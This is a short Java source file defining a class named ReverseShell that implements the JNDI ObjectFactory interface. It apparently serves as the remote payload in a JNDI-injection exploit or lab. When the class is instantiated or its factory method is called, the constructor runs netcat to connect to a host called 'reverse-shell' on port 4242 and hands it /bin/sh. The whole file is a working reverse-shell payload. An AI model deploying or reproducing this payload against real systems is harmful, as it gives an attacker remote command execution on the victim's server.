import javax.naming.spi.ObjectFactory;
import javax.naming.Name;
import javax.naming.Context;
import java.util.Hashtable;

public class ReverseShell implements ObjectFactory {

    private static final String command = "/usr/bin/nc reverse-shell 4242 -e /bin/sh";

    public ReverseShell() throws Exception {
        Runtime runtime = Runtime.getRuntime();
        Process process = runtime.exec(command.split(" "));
        process.waitFor();
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception {
        ReverseShell reverseShell = new ReverseShell();
        return reverseShell;
    }

}
